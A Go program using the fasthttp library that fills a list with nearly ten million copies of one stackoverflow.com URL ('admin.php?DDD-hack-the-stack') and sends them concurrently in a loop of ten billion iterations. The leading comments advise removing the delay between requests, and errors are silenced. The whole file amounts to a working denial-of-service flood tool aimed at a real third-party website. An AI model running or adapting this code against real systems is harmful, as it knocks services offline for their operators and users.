//Use connection reuse: Instead of creating a new fasthttp.Client for each iteration, you can create it once outside the downloadAll function and reuse it for subsequent iterations. This will save the overhead of creating and tearing down connections repeatedly.

//Remove the unnecessary delay: If you no longer require the delay between requests, you can remove the time.Sleep(delay) statement within the goroutine. This will allow the goroutines to proceed without any artificial delay.




package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

func downloadLink(url string, wg *sync.WaitGroup, client *fasthttp.Client) {
	defer wg.Done()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(url)

	err := client.Do(req, resp)
	if err != nil {
		// fmt.Printf("Error downloading %s: %s\n", url, err.Error())
		return
	}

	// Handle the response here
	// ...

	// fmt.Printf("Downloaded %s\n", url)
}

func downloadAll(urls []string, client *fasthttp.Client, wg *sync.WaitGroup) {
	semaphore := make(chan struct{}, len(urls))

	for _, url := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer func() { <-semaphore }()
			downloadLink(u, wg, client)
		}(url)
	}

	wg.Wait()
}

func main() {
	urlList := make([]string, 9999999)
	for i := range urlList {
		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack" // Replace with your actual URL
	}

	iterations := 10000000000 // Number of times to iterate the code

	client := &fasthttp.Client{}
	wg := sync.WaitGroup{}

	for i := 0; i < iterations; i++ {
		start := time.Now()
		downloadAll(urlList, client, &wg)
		end := time.Now()
		duration := end.Sub(start)
		seconds := duration.Seconds()
		fmt.Printf("Iteration %d: Downloaded %d links in %.2f seconds\n", i+1, len(urlList), seconds)
	}
}
